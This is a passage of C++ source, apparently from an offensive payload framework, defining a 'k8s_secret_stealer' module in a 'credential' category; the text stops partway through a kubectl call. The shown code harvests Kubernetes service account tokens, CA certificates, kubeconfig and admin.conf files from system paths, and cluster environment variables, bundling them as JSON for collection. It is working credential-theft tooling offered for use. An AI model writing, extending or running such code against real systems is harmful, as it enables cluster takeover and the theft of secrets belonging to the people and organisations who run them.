#include <sys/stat.h>

#include <cstdlib>
#include <string>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;
using json = nlohmann::json;

std::string user_home() {
    const char* h = getenv("HOME");
    return (h != nullptr) ? std::string(h) : std::string();
}

json find_kube_configs() {
    json configs = json::array();
    std::string home = user_home();
    const std::string paths[] = {
        home + "/.kube/config",
        "/root/.kube/config",
        "/etc/kubernetes/admin.conf",
        "/etc/kubernetes/kubelet.conf",
        "/etc/kubernetes/controller-manager.conf",
        "/etc/kubernetes/scheduler.conf",
        "/var/lib/kubelet/kubeconfig",
    };
    for (const auto& path : paths) {
        std::string data;
        if (!read_file(path, data)) continue;
        if (data.size() > 2000) data = data.substr(0, 2000) + "...";
        json c = json::object();
        c["path"] = path;
        if (!data.empty()) c["content"] = data;
        configs.push_back(c);
    }
    return configs;
}

json first_fields(const std::string& s, size_t max) {
    json out = json::array();
    std::string cur;
    for (char c : s) {
        if (c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\v' || c == '\f') {
            if (!cur.empty()) {
                out.push_back(cur);
                cur.clear();
            }
        } else {
            cur.push_back(c);
        }
    }
    if (!cur.empty()) out.push_back(cur);
    if (out.size() > max) {
        json cut = json::array();
        for (size_t i = 0; i < max; ++i) cut.push_back(out[i]);
        out = cut;
    }
    return out;
}

class K8sSecretStealer : public Payload {
  public:
    const char* name() const override { return "k8s_secret_stealer"; }
    const char* category() const override { return "credential"; }
    const char* description() const override {
        return "Extract K8s secrets, config files, and service account tokens";
    }

    Output execute(const Args&) const override {
        OJ out = OJ::object();
        out["timestamp"] = now_rfc3339();
        out["is_kubernetes"] = false;
        out["namespace"] = "";

        std::string token, cert;
        json summary = json::object();

        const std::string sa_path = "/var/run/secrets/kubernetes.io/serviceaccount";
        struct stat st;
        if (stat(sa_path.c_str(), &st) == 0 && S_ISDIR(st.st_mode)) {
            out["is_kubernetes"] = true;

            std::string ns;
            if (read_file(sa_path + "/namespace", ns)) out["namespace"] = trim(ns);
            if (read_file(sa_path + "/token", token)) out["sa_token"] = trim(token);
            if (read_file(sa_path + "/ca.crt", cert)) out["sa_cert"] = cert;

            summary["sa_token"] = 1;
        }

        json kubeconfigs = find_kube_configs();
        if (!kubeconfigs.empty()) out["kubeconfigs"] = kubeconfigs;
        summary["kubeconfigs"] = (int)kubeconfigs.size();

        json env_vars = json::object();
        for (const char* v : {"KUBERNETES_SERVICE_HOST", "KUBERNETES_SERVICE_PORT",
                              "KUBERNETES_PORT", "KUBERNETES_SERVICE_PORT_HTTPS"}) {
            const char* val = getenv(v);
            if (val != nullptr && *val != '\0') env_vars[v] = val;
        }
        if (!env_vars.empty()) out["env_vars"] = env_vars;

        std::string kubectl = which_exe("kubectl");
        if (!kubectl.empty()) {
            CmdResult secrets = run_cmd_out({
